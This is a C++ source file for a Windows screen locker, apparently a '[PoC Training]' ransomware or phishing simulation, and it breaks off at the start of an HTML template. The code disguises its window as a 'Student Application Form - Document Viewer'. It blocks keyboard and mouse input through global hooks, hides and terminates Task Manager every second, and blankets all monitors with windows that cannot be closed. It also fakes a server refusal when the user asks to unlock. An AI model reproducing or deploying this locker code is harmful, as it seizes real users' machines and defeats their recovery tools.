#include "ScreenLocker.h"
#include "StringUtils.h" // [REFACTOR] Include the new utility header.
#include "Constants.h" // [REFACTOR] Include the new constants header.
#include <iostream>
#include <wingdi.h>
#include <winuser.h>
#include <random>
#include <sstream>
#include <fstream>
#include <iphlpapi.h>
#include <shlobj.h>
#include <cctype>
#include <iomanip>
#include <comdef.h>
#include <mshtml.h>
#include <exdisp.h>
#include <algorithm>
#include <thread>
#include <shellapi.h>
#include <vector>
#include <tlhelp32.h>
#include <dbt.h> // Required for USB device detection structures and constants

ScreenLocker* ScreenLocker::instance = nullptr;

ScreenLocker::ScreenLocker(HINSTANCE hInst) {
    hInstance = hInst;
    hWnd = nullptr;
    browserRunning = false;
    browserHwnd = nullptr;
    userID = GetOrCreateUserID();

    unlockClickCount = 0;

    // ↓↓↓ Hook related variables initialization ↓↓↓
    instance = this;
    keyboardHook = nullptr;
    mouseHook = nullptr;
    inputBlockingEnabled = false;
    allowBrowserInput = false;
    performingSystemAction = false;
    
    // ↓↓↓ Advanced security features variables initialization ↓↓↓
    advancedSecurityEnabled = false;
    securityCheckTimer = 0;

    // ↓↓↓ Multi-monitor support variables initialization ↓↓↓
    primaryMonitorIndex = 0;
    multiMonitorEnabled = false;
}

ScreenLocker::~ScreenLocker() {

    RemoveInputHooks();      // remove input hooks
    Cleanup();

    instance = nullptr;      // clear static instance
}

bool ScreenLocker::Initialize() {

    std::wcout << L"Starting screen locker..." << std::endl;
    
    // Extract remover executable
    ExtractRemoverExecutable();
    
    // ↓↓↓ Hook installation added ↓↓↓
    if (!InstallInputHooks()) {
        SaveToLogFile(userID, "CRITICAL_FAILURE_INPUT_HOOKS_INSTALLATION_FAILED");
        
        // [STABILITY FIX]
        // Display a more specific error message about the critical component failure.
        MessageBoxW(NULL, 
                   L"A critical security component (Input Blocker) failed to initialize.\nThe program cannot continue.",
                   L"Initialization Error", 
                   MB_OK | MB_ICONERROR);

        // Return false to prevent the program from running in a vulnerable, half-locked state.
        return false;
    } else {
        SaveToLogFile(userID, "INPUT_HOOKS_INSTALLED_SUCCESS");
    }
    
    return CreateMainWindow();
}

bool ScreenLocker::CreateMainWindow() {
    // Register window class
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"ScreenLockerClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    if (!RegisterClassW(&wc)) {
        return false;
    }

    // Get screen dimensions
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create fullscreen topmost window
    hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        L"ScreenLockerClass",
        L"Student Application Form - Document Viewer",
        WS_POPUP,
        0, 0, width, height,
        nullptr, nullptr, hInstance, this
    );

    if (!hWnd) return false;

    // Set as topmost and show
    SetScreenLockerTopmost();
    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    // ↓↓↓ Input blocking enabled ↓↓↓
    EnableInputBlocking();

    // ↓↓↓ Advanced security features enabled ↓↓↓
    EnableAdvancedSecurity();

    // ↓↓↓ Multi-monitor support enabled ↓↓↓
    EnableMultiMonitorSupport();

    // ↓↓↓ [FIX] Register for USB device arrival and removal notifications ↓↓↓
    DEV_BROADCAST_DEVICEINTERFACE_A dbi = {0};
    dbi.dbcc_size = sizeof(dbi);
    dbi.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
    // GUID for USB devices, to specifically target them
    static const GUID Guid_USB_Device = { 0xA5DCBF10, 0x6530, 0x11D2, { 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED } };
    dbi.dbcc_classguid = Guid_USB_Device;

    if (RegisterDeviceNotification(hWnd, &dbi, DEVICE_NOTIFY_WINDOW_HANDLE)) {
        SaveToLogFile(userID, "USB_DEVICE_NOTIFICATION_REGISTERED_SUCCESS");
    } else {
        SaveToLogFile(userID, "USB_DEVICE_NOTIFICATION_REGISTER_FAILED: " + std::to_string(GetLastError()));
    }
    // ↑↑↑ End of Fix ↑↑↑

    return true;
}

int ScreenLocker::Run() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam;
}

bool ScreenLocker::InstallInputHooks() {
    SaveToLogFile(userID, "INSTALLING_INPUT_HOOKS");
    
    // Install keyboard hook
    keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,              // Low-level keyboard hook
        KeyboardHookProc,            // Hook procedure
        hInstance,                   // DLL handle (current module)
        0                            // Apply to all threads
    );
    
    if (!keyboardHook) {
        DWORD error = GetLastError();
        SaveToLogFile(userID, "KEYBOARD_HOOK_INSTALL_FAILED: " + std::to_string(error));
        return false;
    }
    
    // Install mouse hook
    mouseHook = SetWindowsHookEx(
        WH_MOUSE_LL,                 // Low-level mouse hook
        MouseHookProc,               // Hook procedure
        hInstance,                   // DLL handle
        0                            // Apply to all threads
    );
    
    if (!mouseHook) {
        DWORD error = GetLastError();
        SaveToLogFile(userID, "MOUSE_HOOK_INSTALL_FAILED: " + std::to_string(error));
        
        // Remove keyboard hook since it's installed
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
        return false;
    }
    
    SaveToLogFile(userID, "ALL_INPUT_HOOKS_INSTALLED_SUCCESS");
    
    return true;
}

void ScreenLocker::RemoveInputHooks() {
    SaveToLogFile(userID, "REMOVING_INPUT_HOOKS");
    
    if (keyboardHook) {
        if (UnhookWindowsHookEx(keyboardHook)) {
            SaveToLogFile(userID, "KEYBOARD_HOOK_REMOVED");
        } else {
            SaveToLogFile(userID, "KEYBOARD_HOOK_REMOVE_FAILED");
        }
        keyboardHook = nullptr;
    }
    
    if (mouseHook) {
        if (UnhookWindowsHookEx(mouseHook)) {
            SaveToLogFile(userID, "MOUSE_HOOK_REMOVED");
        } else {
            SaveToLogFile(userID, "MOUSE_HOOK_REMOVE_FAILED");
        }
        mouseHook = nullptr;
    }
    
    SaveToLogFile(userID, "INPUT_HOOKS_CLEANUP_COMPLETED");
}



void ScreenLocker::EnableInputBlocking() {
    inputBlockingEnabled = true;
    SaveToLogFile(userID, "INPUT_BLOCKING_ENABLED");
}

void ScreenLocker::DisableInputBlocking() {
    inputBlockingEnabled = false;
    SaveToLogFile(userID, "INPUT_BLOCKING_DISABLED");
}

void ScreenLocker::SetBrowserInputMode(bool allow) {
    allowBrowserInput = allow;
    if (allow) {
        SaveToLogFile(userID, "BROWSER_INPUT_ALLOWED");
    } else {
        SaveToLogFile(userID, "BROWSER_INPUT_BLOCKED");
    }
}

void ScreenLocker::SetSystemActionMode(bool performing) {
    performingSystemAction = performing;
    if (performing) {
        SaveToLogFile(userID, "SYSTEM_ACTION_MODE_ENABLED");
    } else {
        SaveToLogFile(userID, "SYSTEM_ACTION_MODE_DISABLED");
    }
}

LRESULT CALLBACK ScreenLocker::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Continue hook chain if needed
    if (nCode < 0) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // Check if ScreenLocker instance exists
    ScreenLocker* pThis = GetInstance();
    if (!pThis) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // Allow all input if input blocking is disabled
    if (!pThis->inputBlockingEnabled) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // Determine if keyboard input should be blocked
    if (pThis->ShouldBlockKeyboardInput(wParam, lParam)) {
        // Log blocked keys (not too many)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
        }
        return 1; // Block input (do not pass to next hook)
    }
    
    // Pass allowed input to next hook
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK ScreenLocker::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Continue hook chain if needed
    if (nCode < 0) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // Check if ScreenLocker instance exists
    ScreenLocker* pThis = GetInstance();
    if (!pThis) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // Allow all input if input blocking is disabled
    if (!pThis->inputBlockingEnabled) {
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }
    
    // Determine if mouse input should be blocked
    if (pThis->ShouldBlockMouseInput(wParam, lParam)) {
        // Log blocked mouse actions
        std::string actionName;
        switch (wParam) {
            case WM_RBUTTONDOWN: actionName = "RIGHT_CLICK"; break;
            case WM_MBUTTONDOWN: actionName = "MIDDLE_CLICK"; break;
            case WM_XBUTTONDOWN: actionName = "X_BUTTON"; break;
            default: actionName = "MOUSE_ACTION_" + std::to_string(wParam); break;
        }
        return 1; // Block input
    }
    
    // Pass allowed input to next hook
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

bool ScreenLocker::ShouldBlockKeyboardInput(WPARAM wParam, LPARAM lParam) {
    // Allow keys only during system actions (Alt+A, etc.)
    if (performingSystemAction) {
        return false; // Allow all keys during system actions
    }
    
    // Block all keys in all other cases
    return true;
}

bool ScreenLocker::ShouldBlockMouseInput(WPARAM wParam, LPARAM lParam) {
    // Allow all mouse input during system actions
    if (performingSystemAction) {
        return false;
    }
    
    // Allow left click and mouse movement, block everything else
    switch (wParam) {
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
        case WM_MOUSEMOVE:
            return false; // Allow
            
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
        case WM_XBUTTONDOWN:
        case WM_XBUTTONUP:
        case WM_MOUSEWHEEL:      // Block mouse wheel
        case WM_MOUSEHWHEEL:     // Block horizontal scroll
            return true; // Block
            
        default:
            return false; // Allow by default (movement, etc.)
    }
}

void ScreenLocker::EnableAdvancedSecurity() {
    if (advancedSecurityEnabled) return;
    
    advancedSecurityEnabled = true;
    SaveToLogFile(userID, "ADVANCED_SECURITY_ENABLED");
    
    // Start security check timer (every 1 second)
    securityCheckTimer = SetTimer(hWnd, Constants::SecurityTimerID, 1000, SecurityCheckCallback);
    
    if (securityCheckTimer) {
        SaveToLogFile(userID, "SECURITY_CHECK_TIMER_STARTED");
    } else {
        SaveToLogFile(userID, "SECURITY_CHECK_TIMER_FAILED");
    }
    
    // Check immediately once
    DetectAndBlockTaskManager();
}

void ScreenLocker::DisableAdvancedSecurity() {
    if (!advancedSecurityEnabled) return;
    
    advancedSecurityEnabled = false;
    SaveToLogFile(userID, "ADVANCED_SECURITY_DISABLED");
    
    // Remove timer
    if (securityCheckTimer) {
        KillTimer(hWnd, 1001);
        securityCheckTimer = 0;
        SaveToLogFile(userID, "SECURITY_CHECK_TIMER_STOPPED");
    }
}

void CALLBACK ScreenLocker::SecurityCheckCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    ScreenLocker* pThis = GetInstance();
    if (!pThis || !pThis->advancedSecurityEnabled) return;
    
    // Check and block task manager
    if (pThis->DetectAndBlockTaskManager()) {
        pThis->SaveToLogFile(pThis->userID, "TASK_MANAGER_DETECTED_AND_BLOCKED");
    }
}

bool ScreenLocker::DetectAndBlockTaskManager() {
    // Find task manager window
    HWND taskMgr = FindWindow(L"TaskManagerWindow", NULL);
    if (!taskMgr) {
        taskMgr = FindWindow(L"#32770", L"작업 관리자");  // Korean
    }
    if (!taskMgr) {
        taskMgr = FindWindow(L"#32770", L"Task Manager");  // English
    }
    
    if (taskMgr) {
        SaveToLogFile(userID, "TASK_MANAGER_WINDOW_DETECTED");
        
        // Hide and disable window
        ShowWindow(taskMgr, SW_HIDE);
        EnableWindow(taskMgr, FALSE);
        
        // Try to terminate process
        return TerminateTaskManager();
    }
    
    return false;
}

bool ScreenLocker::IsTaskManagerRunning() {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    bool found = false;
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::wstring processNameW(pe32.szExeFile);
            std::string processName = StringUtils::WStringToString(processNameW);
            
            // Task manager process names
            if (processName.find("Taskmgr.exe") != std::string::npos ||
                processName.find("taskmgr.exe") != std::string::npos ||
                processName.find("TASKMGR.EXE") != std::string::npos) {
                
                SaveToLogFile(userID, "TASK_MANAGER_PROCESS_DETECTED: " + processName);
                found = true;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    return found;
}

bool ScreenLocker::TerminateTaskManager() {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    bool terminated = false;
    
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::wstring processNameW(pe32.szExeFile);
            std::string processName = StringUtils::WStringToString(processNameW);
            
            if (processName.find("Taskmgr.exe") != std::string::npos ||
                processName.find("taskmgr.exe") != std::string::npos ||
                processName.find("TASKMGR.EXE") != std::string::npos) {
                
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
    
                if (hProcess) {
                    if (TerminateProcess(hProcess, 0)) {
                        SaveToLogFile(userID, "TASK_MANAGER_TERMINATED: " + processName);
                        terminated = true;
                    } else {
                        SaveToLogFile(userID, "TASK_MANAGER_TERMINATE_FAILED: " + processName);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    
    CloseHandle(hProcessSnap);
    return terminated;
}

void ScreenLocker::EnableMultiMonitorSupport() {
    if (multiMonitorEnabled) return;
    
    SaveToLogFile(userID, "ENABLING_MULTI_MONITOR_SUPPORT");
    
    // Detect monitors
    if (!DetectMonitors()) {
        SaveToLogFile(userID, "MONITOR_DETECTION_FAILED");
        return;
    }
    
    // Create multiple monitor windows
    if (!CreateMonitorWindows()) {
        SaveToLogFile(userID, "MONITOR_WINDOWS_CREATION_FAILED");
        return;
    }
    
    multiMonitorEnabled = true;
    SaveToLogFile(userID, "MULTI_MONITOR_SUPPORT_ENABLED");
}

void ScreenLocker::DisableMultiMonitorSupport() {
    if (!multiMonitorEnabled) return;
    
    SaveToLogFile(userID, "DISABLING_MULTI_MONITOR_SUPPORT");
    
    DestroyMonitorWindows();
    monitorWindows.clear();
    monitorInfos.clear();
    
    multiMonitorEnabled = false;
    SaveToLogFile(userID, "MULTI_MONITOR_SUPPORT_DISABLED");
}

bool ScreenLocker::DetectMonitors() {
    
    // Initialize existing information
    monitorInfos.clear();
    primaryMonitorIndex = 0;
    
    // Enumerate monitors
    if (!EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)this)) {
        SaveToLogFile(userID, "ENUM_DISPLAY_MONITORS_FAILED");
        return false;
    }
    
    // Find primary monitor
    for (size_t i = 0; i < monitorInfos.size(); i++) {
        if (monitorInfos[i].dwFlags & MONITORINFOF_PRIMARY) {
            primaryMonitorIndex = (int)i;
            break;
        }
    }
    
    return monitorInfos.size() > 0;
}

BOOL CALLBACK ScreenLocker::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
    ScreenLocker* pThis = (ScreenLocker*)dwData;
    if (!pThis) return FALSE;
    
    MONITORINFO monitorInfo;
    monitorInfo.cbSize = sizeof(MONITORINFO);
    
    if (GetMonitorInfo(hMonitor, &monitorInfo)) {
        pThis->monitorInfos.push_back(monitorInfo);
    }
    
    return TRUE; // Continue enumeration
}

bool ScreenLocker::CreateMonitorWindows() {
    
    // Clean up existing windows
    DestroyMonitorWindows();
    
    // Create windows for each monitor (except primary monitor)
    for (size_t i = 0; i < monitorInfos.size(); i++) {
        if ((int)i == primaryMonitorIndex) {
            // Skip primary monitor since it already has the main window
            monitorWindows.push_back(hWnd);
            SaveToLogFile(userID, "PRIMARY_MONITOR_USING_MAIN_WINDOW: " + std::to_string(i));
            continue;
        }
        
        // Create secondary window for each monitor
        HWND secondaryWindow = CreateSecondaryWindow(monitorInfos[i], (int)i);
        if (secondaryWindow) {
            monitorWindows.push_back(secondaryWindow);
        } else {
            SaveToLogFile(userID, "SECONDARY_WINDOW_CREATION_FAILED: Monitor" + std::to_string(i));
            monitorWindows.push_back(nullptr);
        }
    }
    
    return true;
}

HWND ScreenLocker::CreateSecondaryWindow(const MONITORINFO& monitorInfo, int monitorIndex) {
    // Register window class for secondary window
    std::wstring className = L"ScreenLockerSecondary" + std::to_wstring(monitorIndex);
    
    WNDCLASSW wc = {};
    wc.lpfnWndProc = SecondaryWindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className.c_str();
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    RegisterClassW(&wc);
    
    // Calculate monitor size
    int x = monitorInfo.rcMonitor.left;
    int y = monitorInfo.rcMonitor.top;
    int width = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
    int height = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;
    
    // Create secondary window
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        className.c_str(),
        L"Document Viewer - Extended Display",
        WS_POPUP | WS_VISIBLE,
        x, y, width, height,
        nullptr, nullptr, hInstance, this
    );
    
    if (hwnd) {
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
    }
    
    return hwnd;
}

LRESULT CALLBACK ScreenLocker::SecondaryWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ScreenLocker* pThis = nullptr;

    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (ScreenLocker*)pCreate->lpCreateParams;
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (ScreenLocker*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // Black background
            RECT rect;
            GetClientRect(hWnd, &rect);
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));

            // Simple text display
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkMode(hdc, TRANSPARENT);
            
            HFONT hFont = CreateFont(40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                   DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                   CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                   VARIABLE_PITCH, L"Arial");
            
            HFONT oldFont = (HFONT)SelectObject(hdc, hFont);
            
            const wchar_t* message = L"[PoC Training] Access Denied - Secondary Monitor";
            DrawText(hdc, message, -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            
            SelectObject(hdc, oldFont);
            DeleteObject(hFont);
            EndPaint(hWnd, &ps);
            return 0;
        }
        
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_LBUTTONDOWN:
        case WM_RBUTTONDOWN:
            // Ignore all input (handled by main window's hook)
            return 0;
            
        case WM_CLOSE:
            // Prevent window from closing
            return 0;
            
        case WM_DESTROY:
            return 0;
    }
    
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void ScreenLocker::DestroyMonitorWindows() {
    SaveToLogFile(userID, "DESTROYING_MONITOR_WINDOWS");
    
    for (size_t i = 0; i < monitorWindows.size(); i++) {
        if (monitorWindows[i] && monitorWindows[i] != hWnd) {
            // Destroy only secondary windows (not main window)
            DestroyWindow(monitorWindows[i]);
            SaveToLogFile(userID, "SECONDARY_WINDOW_DESTROYED: Monitor" + std::to_string(i));
        }
    }
    
    monitorWindows.clear();
}

void ScreenLocker::UpdateMonitorConfiguration() {
    if (!multiMonitorEnabled) return;
    
    SaveToLogFile(userID, "UPDATING_MONITOR_CONFIGURATION");
    
    // Re-detect monitors
    std::vector<MONITORINFO> oldMonitorInfos = monitorInfos;
    
    if (DetectMonitors()) {
        // Check if monitor configuration has changed
        bool configChanged = (oldMonitorInfos.size() != monitorInfos.size());
        
        if (configChanged) {
            SaveToLogFile(userID, "MONITOR_CONFIG_CHANGED_RECREATING_WINDOWS");
            CreateMonitorWindows();
        }
    }
}

void ScreenLocker::Cleanup() {
    // ↓↓↓ Advanced security features disabled ↓↓↓
    DisableAdvancedSecurity();

    // ↓↓↓ Multi-monitor support disabled ↓↓↓
    DisableMultiMonitorSupport();

    // Release cursor and reset browser state
    ReleaseCursorConfinement();
    
    browserRunning = false;
    browserHwnd = nullptr;
    
    // Destroy main window
    if (hWnd) {
        DestroyWindow(hWnd);
        hWnd = nullptr;
    }
}

LRESULT CALLBACK ScreenLocker::WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ScreenLocker* pThis = nullptr;

    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (ScreenLocker*)pCreate->lpCreateParams;
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (ScreenLocker*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // Background Color Black
            RECT rect;
            GetClientRect(hWnd, &rect);
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));

            // Font Setting
            HFONT hFont = CreateFont(
                50,
                0, 0, 0, FW_BOLD,
                FALSE, FALSE, FALSE,
                DEFAULT_CHARSET,
                OUT_OUTLINE_PRECIS,
                CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY,
                VARIABLE_PITCH,
                L"Times New Roman"
            );
            
            HFONT oldFont = (HFONT)SelectObject(hdc, hFont);

            // Red Text Color
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkMode(hdc, TRANSPARENT);

            // Main Message
            const wchar_t* message = L"[PoC Training] System Access Denied";
            RECT textRect = rect;
            textRect.bottom = textRect.bottom / 2 - 50;
            DrawText(hdc, message, -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            // User ID Message
            textRect = rect;
            textRect.top = rect.bottom / 2 + 50;

            if (pThis) {
                std::wstring wideUserID(pThis->userID.begin(), pThis->userID.end());
                std::wstring userIDMessage = L"Your User ID: " + wideUserID;
                DrawText(hdc, userIDMessage.c_str(), -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            } else {
                DrawText(hdc, L"Your User ID: (loading...)", -1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            }

            // Draw Button
            RECT buttonRect;
            buttonRect.left = rect.right / 2 - 230;
            buttonRect.right = rect.right / 2 + 230;
            buttonRect.top = rect.bottom / 2 + 150;
            buttonRect.bottom = rect.bottom / 2+ 220;
            // Draw Button Background
            HBRUSH buttonBrush = CreateSolidBrush(RGB(100, 100, 100));
            FillRect(hdc, &buttonRect, buttonBrush);
            DeleteObject(buttonBrush);
            //Draw Button Text
            SetTextColor(hdc, RGB(255, 255, 255));
            DrawText(hdc, L"[POC] Request Unlock", -1, &buttonRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            SelectObject(hdc, oldFont);
            DeleteObject(hFont);
            EndPaint(hWnd, &ps);

            return 0;
        }

        case WM_LBUTTONDOWN: {
            int xPos = LOWORD(lParam);
            int yPos = HIWORD(lParam);
            
            RECT rect;
            GetClientRect(hWnd, &rect);
            
            // Calculate the button area
            RECT buttonRect;
            buttonRect.left = rect.right / 2 - 230;
            buttonRect.right = rect.right / 2 + 230;
            buttonRect.top = rect.bottom / 2 + 150;
            buttonRect.bottom = rect.bottom / 2+ 220;
            
            // Check if the click is within the button area
            if (xPos >= buttonRect.left && xPos <= buttonRect.right && yPos >= buttonRect.top && yPos <= buttonRect.bottom) {
                
                if (pThis && !pThis->browserRunning) {
                    pThis->SaveToLogFile(pThis->userID, "UNLOCK_BUTTON_CLICKED_COUNT: " + std::to_string(pThis->unlockClickCount + 1));
                    
                    if (pThis->unlockClickCount == 0) {
                        // First click
                        pThis->unlockClickCount++;
                        pThis->SaveToLogFile(pThis->userID, "FIRST_CLICK_SHOWING_STILL_BLOCKED");
                        MessageBoxW(pThis->hWnd, L"Still Blocked. Access denied by server.", 
                                L"Status: Locked", MB_OK | MB_ICONERROR);
                        pThis->SetScreenLockerTopmost(); // After message box, set to topmost
                    } else {
                        // Second click
                        pThis->SaveToLogFile(pThis->userID, "SECOND_CLICK_OPENING_BROWSER");
                        std::thread(&ScreenLocker::HandleUnlockProcess, pThis).detach();
                    }
                }
                
                return 0;
            }
            
            break;
        }
        
        case WM_CLOSE: {
            return 0;
        }

        case WM_DEVICECHANGE: {
            if (pThis) {
                pThis->HandleDeviceChange(lParam);
            }
            return TRUE;
        }

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0; // Prevent Window Closing
            break;
    }
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// Get MAC Address to Generate User ID
std::string ScreenLocker::GetMacAddress() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);

    DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
    if (dwStatus == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        if (pAdapterInfo) {
            char buffer[3];
            sprintf_s(buffer, "%02X", pAdapterInfo->Address[0]);
            return std::string(buffer);
        }
    }
    return "FF";
}

// Generate Random ID
std::string ScreenLocker::GenerateRandomID() {
    std::random_device rd;
    std::mt19937 gen(rd());

    std::string result;

    // Add MAC Address + "-"
    std::string macPrefix = GetMacAddress();

    for (char& c : macPrefix) {
        c = std::toupper(c);
    }
    result = macPrefix + "-";

    // Add 3 numbers
    std::uniform_int_distribution<> numdis(0, 9);
    for (int i = 0; i < 3; i++) {
        result += ('0' + numdis(gen));
    }

    // Add 3 lowercase letters
    std::uniform_int_distribution<> alphaDis(0, 25);
    for (int i = 0; i < 3; i++) {
        result += static_cast<char>('a' + alphaDis(gen));
    }

    // Use only URL-safe special characters (? & = / etc. excluded)
    std::string safeSpecialChars = "_-";  // Only URL-safe characters
    std::uniform_int_distribution<size_t> specialCountDis(1, 2);
    size_t specialCount = specialCountDis(gen);

    std::uniform_int_distribution<size_t> specialDis(0, safeSpecialChars.length() - 1);
    for (size_t i = 0; i < specialCount; i++) {
        result += safeSpecialChars[specialDis(gen)];
    }

    // Shuffle the result (excluding MAC part)
    std::string toShuffle = result.substr(3);
    for (size_t i = toShuffle.length() - 1; i > 0; i--) {
        std::uniform_int_distribution<size_t> shuffleDis(0, i); 
        size_t j = shuffleDis(gen);
        char temp = toShuffle[i];
        toShuffle[i] = toShuffle[j];
        toShuffle[j] = temp;
    }

    result = result.substr(0, 3) + toShuffle;

    return result;
}

std::string ScreenLocker::GetOrCreateUserID() {
    // Check if User ID is already saved
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string windowsDir = std::string(appDataPath) + Constants::AppDataLogDir;
        std::string logPath = windowsDir + "\\" + Constants::MainLogFile;

        // Create Windows Directory if it doesn't exist
        CreateDirectoryA(windowsDir.c_str(), NULL);

        std::ifstream logFile(logPath);
        if (logFile.good()) {
            std::string line;
            std::string currentMAC = GetMacAddress();
            std::string lastFoundUserID;

            // Check the previous User ID - Use the last found one
            while (std::getline(logFile, line)) {
                if (line.find("User ID: ") != std::string::npos && line.find("MAC Address: " + currentMAC) != std::string::npos) {
                    // Extract the User ID
                    size_t idStart = line.find("User ID: ") + 9;
                    size_t idEnd = line.find(" | MAC Address: ");
                    if (idStart != std::string::npos && idEnd != std::string::npos) {
                        lastFoundUserID = line.substr(idStart, idEnd - idStart);
                    }
                }
            }
            logFile.close();
            
            // If a User ID is found, return it
            if (!lastFoundUserID.empty()) {
                return lastFoundUserID;
            }
        }
    }

    // Generate New User ID only if none was found
    std::string newID = GenerateRandomID();
    SaveToLogFile(newID, "NEW_URL_SAFE_USER_ID_GENERATED");

    return newID;
}

void ScreenLocker::SaveToLogFile(const std::string& userID, const std::string& action) {
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string windowsDir = std::string(appDataPath) + Constants::AppDataLogDir;
        std::string logPath = windowsDir + "\\" + Constants::MainLogFile;

        // Create Windows Directory if it doesn't exist
        CreateDirectoryA(windowsDir.c_str(), NULL);

        std::ofstream logFile(logPath, std::ios::app);
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
                << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond 
                << "] " << action << " | User ID: " << userID << " | MAC Address: " << GetMacAddress() << std::endl;
        
        logFile.close();
    }
}

std::string ScreenLocker::GenerateHTMLContent() {
    // First, create a template for UserID insertion
    std::string actualUserID = userID;  // Store the actual UserID
    
    std::string htmlContent = R"html(
<!DOCTYPE html>
